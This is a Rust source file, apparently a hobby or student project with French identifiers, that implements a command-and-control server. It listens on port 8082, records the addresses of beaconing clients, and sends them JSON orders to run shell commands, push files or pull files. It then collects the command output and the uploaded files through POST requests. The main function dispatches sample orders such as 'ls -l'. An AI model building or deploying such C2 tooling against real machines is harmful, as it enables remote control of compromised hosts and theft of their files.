use std::{
    fs::{OpenOptions, File},
    io::{prelude::*, BufReader, Cursor},
    net::{SocketAddr},
};
use chrono::prelude::*;
use tiny_http::{Response};
use serde::{Serialize, Deserialize};  


#[derive(Serialize, Deserialize, Debug, Clone)]
enum OrdreType {
    Commande,
    Fichier,
    GetFichier,
    Vitesse,
    Autre
}

#[derive(Serialize, Deserialize, Debug)]
struct Ordre {
    ordre: OrdreType,
    arguments: Vec<String>,
}

fn write_incoming_ip(request : Option<&SocketAddr>){
    let fp = "./beacon.txt";
    let does_exist = std::path::Path::new(fp).exists();
    if !does_exist {
        File::create(fp).unwrap();
    }  
    let mut ip = String::from("Unknown IP");
    match request{
        Some(res) => {
            ip = String::from(res.to_string());
            let temp_ip = String::from(res.to_string());
            let split = temp_ip.split(":");
            let mut compteur = true;
            for l in split{
                if compteur{
                    ip = String::from(l);
                    compteur = false;
                }
            }
            println!("{}", ip);
        },
        None => ()
    }
    let file = File::open(fp).unwrap();
    let reader = BufReader::new(file);
    let mut does_exist = false;
    for line in reader.lines() {
        match line {
            Ok(l) => {
                if l.contains(&ip) {
                    does_exist = true;
                }
            },
            Err(_) => {
                println!("error reading lines in file");
            }
        }
    }
    if !does_exist{
        let mut file_ref = OpenOptions::new().append(true).open(fp).expect("Unable to open file"); 
        file_ref.write_all(ip.as_bytes()).expect("write failed");
        file_ref.write_all(" - active \n".as_bytes()).expect("write failed");
    }
}

fn write_logs(request : Option<&SocketAddr>){
    let fp = "./logs.txt";
    let does_exist = std::path::Path::new(fp).exists();
    if !does_exist {
        File::create(fp).unwrap();
    }
    let mut file_ref = OpenOptions::new().append(true).open(fp).expect("Unable to open file");   
    file_ref.write_all("Incoming connection from: ".as_bytes()).expect("write failed");
    let mut ip = String::from("Unknown IP");
    match request{
        Some(res) => {
            ip = String::from(res.to_string());
        },
        None => ()
    }
    file_ref.write_all(ip.as_bytes()).expect("write failed");
    file_ref.write_all(" at : ".as_bytes()).expect("write failed");
    let date_as_string = Utc::now().to_string();
    file_ref.write_all(date_as_string.as_bytes()).expect("write failed");
    file_ref.write_all("\n".as_bytes()).expect("write failed");
    println!("Log appended successfully"); 
}

async fn handle_post_request(server: & tiny_http::Server) -> () {

    let request = server.recv();

    match request {
        Ok(mut rq) => {

            if *rq.method() == tiny_http::Method::Post {

                let mut content = String::new();
                rq.as_reader().read_to_string(&mut content).unwrap();

                println!("{}", content);
            
                let response = Response::from_string("Recu requete POST\n");
                rq.respond(response).unwrap();
            }
        },
        Err(e) => { println!("error: {}", e);  }
    };
}

async fn handle_file_post_request(server: & tiny_http::Server, filename: &str, ordre: OrdreType) -> () {

    let request = server.recv();

    match request {
        Ok(mut rq) => {

            if *rq.method() == tiny_http::Method::Post {

                match ordre {
                    OrdreType::Fichier => {
                        let file = std::fs::File::open(filename).unwrap();

                        let mut response = Response::from_file(file);
                        let header = tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"multipart/form-data"[..]).unwrap();
                        response.add_header(header);
                        rq.respond(response).unwrap();
                    },
                    OrdreType::GetFichier => {
                        let mut file = std::fs::File::create(filename).unwrap();
                        
                        let mut content = rq.as_reader();
                        std::io::copy(&mut content, &mut file).unwrap();

                        let response = Response::from_string("Received file via POST");
                        rq.respond(response).unwrap();
                    },
                    _ => {
                        panic!("Not implemented");
                    }

                }
                
            }
        },
        Err(e) => { println!("error: {}", e);  }
    };
}


async fn send_ordre(server: & tiny_http::Server, ordre: OrdreType, arguments: Vec<String>) -> () {
    let request = server.recv();
    match request {
        Ok(rq) => {

            if *rq.method() == tiny_http::Method::Get {

                println!("Incoming connection from: {:?} \n", rq.remote_addr());
                write_incoming_ip(rq.remote_addr());
                write_logs(rq.remote_addr());

                let bod = Ordre { ordre: ordre.clone(), arguments: arguments.clone() };

                let response = Response::from_string(serde_json::to_string(&bod).unwrap());
                rq.respond(response).unwrap();

                match ordre {
                    OrdreType::Commande => {
                        handle_post_request(&server).await;
                    },
                    OrdreType::Fichier | OrdreType::GetFichier => {
                        let filename = arguments[0].as_str();
                        handle_file_post_request(&server, filename, ordre).await;
                    },
                    _ => ()
                }

            }

        },
        Err(e) => { println!("error: {}", e);  }
    };

}


#[tokio::main]
async fn main() {
    let server = tiny_http::Server::http("0.0.0.0:8082").unwrap();
    //////////////////////// Envoie une commande ls pour l'example
    send_ordre(&server, OrdreType::Commande, vec![String::from("ls"), String::from("-l")]).await;
    //////////////////////// envoie un echo pour l'exemple
    send_ordre(&server, OrdreType::Commande, vec![String::from("echo"), String::from("titouan")]).await;
    //////////////////////// envoie un fichier pour l'exemple
    send_ordre(&server, OrdreType::Fichier, vec![String::from("texte.txt")]).await;
    //recevoir un fichiet texte
    send_ordre(&server, OrdreType::GetFichier, vec![String::from("fichier.txt")]).await;

    send_ordre(&server, OrdreType::Vitesse, vec![String::from("1")]).await;
}